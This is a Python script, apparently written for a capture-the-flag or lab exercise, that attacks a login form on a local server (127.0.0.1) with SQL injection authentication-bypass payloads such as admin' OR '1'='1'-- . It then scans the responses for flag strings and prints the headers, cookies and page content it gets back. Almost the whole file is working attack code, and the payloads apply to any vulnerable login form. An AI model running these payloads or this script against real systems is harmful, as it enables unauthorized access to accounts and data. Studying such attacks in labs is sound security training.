"""
Deep analysis of successful SQLi authentication bypass responses
Extract and analyze the actual content returned from successful bypass attempts
"""

import requests
import time

# Target configuration
target_url = "http://127.0.0.1:32829/index.php"

# Use one of the successful payloads from previous test
successful_payload = "admin' OR '1'='1'-- "

print(f"[*] Testing successful payload: {successful_payload}")
print(f"[*] Making request to {target_url}")
print("=" * 80)

try:
    response = requests.post(
        target_url,
        data={"username": successful_payload, "password": "password"},
        timeout=30
    )
    
    print(f"\n[+] Response Analysis:")
    print(f"Status Code: {response.status_code}")
    print(f"Content Length: {len(response.content)} bytes")
    print(f"Response Time: {round(response.elapsed.total_seconds(), 3)} seconds")
    print()
    
    # Check for common flag patterns
    import re
    flag_patterns = [
        r'FLAG\{[^}]+\}',
        r'flag\{[^}]+\}',
        r'[A-Fa-f0-9]{32,64}',
        r'ctf\{[^}]+\}',
        r'challenge\{[^}]+\}'
    ]
    
    print("[+] Searching for flag patterns...")
    flags_found = []
    for pattern in flag_patterns:
        matches = re.findall(pattern, response.text, re.IGNORECASE)
        if matches:
            flags_found.extend(matches)
    
    if flags_found:
        print(f"\n🚩 FLAGS FOUND: {flags_found}")
    else:
        print("[-] No flag patterns found")
    
    # Extract and print the full response
    print("\n" + "=" * 80)
    print("[+] FULL RESPONSE BODY:")
    print("=" * 80)
    print(response.text)
    print("\n" + "=" * 80)
    
    # Look for specific content
    print("\n[+] Content Analysis:")
    
    # Search for authentication-related content
    auth_indicators = [
        "welcome", "dashboard", "logged in", "success", "authenticated",
        "hello", "user", "profile", "admin", "session", "token", "successfully"
    ]
    
    found_indicators = []
    for indicator in auth_indicators:
        if indicator.lower() in response.text.lower():
            found_indicators.append(indicator)
    
    if found_indicators:
        print(f"[+] Authentication indicators found: {found_indicators}")
    else:
        print("[-] No common authentication indicators found")
    
    # Check if it's HTML and extract title/body
    title_match = re.search(r'<title[^>]*>([^<]+)</title>', response.text, re.IGNORECASE)
    if title_match:
        print(f"[+] Page Title: {title_match.group(1).strip()}")
    else:
        print("[-] No title tag found")
    
    # Look for forms, links, or interactive elements
    form_count = len(re.findall(r'<form', response.text, re.IGNORECASE))
    print(f"[+] Number of forms: {form_count}")
    
    link_count = len(re.findall(r'<a href', response.text, re.IGNORECASE))
    print(f"[+] Number of links: {link_count}")
    
    script_count = len(re.findall(r'<script', response.text, re.IGNORECASE))
    print(f"[+] Number of scripts: {script_count}")
    
    # Check response headers for clues
    print("\n[+] Response Headers:")
    for key, value in response.headers.items():
        print(f"  {key}: {value}")
    
    # Check for cookies
    if response.cookies:
        print("\n[+] Cookies received:")
        for cookie in response.cookies:
            print(f"  {cookie.name}: {cookie.value}")
    else:
        print("\n[+] No cookies received")
    
    # Check for specific error messages that indicate the bypass didn't work
    error_indicators = [
        "access denied", "invalid", "wrong", "incorrect", "fail",
        "unauthorized", "forbidden", "error", "exception"
    ]
    
    error_found = []
    for error in error_indicators:
        if error.lower() in response.text.lower():
            error_found.append(error)
    
    if error_found:
        print(f"\n[-] Error indicators found: {error_found}")
    else:
        print(f"\n[+] No error indicators found - possible successful bypass")
    
    # Save response to file for manual inspection
    with open("sqli_bypass_response.html", "w") as f:
        f.write(response.text)
    print(f"\n[+] Response saved to sqli_bypass_response.html")
    
except Exception as e:
    print(f"[!] Error: {e}")

# Test a few more payloads to see if we get different responses
test_payloads = [
    "admin'-- ",
    "' OR '1'='1'-- ",
    "admin' AND '1'='1'-- "
]

print("\n" + "=" * 80)
print("Testing additional payloads for comparison...")
print("=" * 80)

for i, test_payload in enumerate(test_payloads, 1):
    print(f"\n[{i}] Payload: {test_payload}")
    try:
        resp = requests.post(target_url, data={"username": test_payload, "password": "test"}, timeout=10)
        print(f"    Status: {resp.status_code} | Size: {len(resp.content)}B")
        
        # Check if content is different
        if resp.content != response.content:
            print(f"    [!] Different response content detected!")
            # Find differences
            diff_size = abs(len(resp.content) - len(response.content))
            print(f"    Size difference: {diff_size}B")
        else:
            print(f"    [+] Same response as before")
            
    except Exception as e:
        print(f"    [!] Error: {e}")

print("\n" + "=" * 80)
print("[*] Analysis complete!")
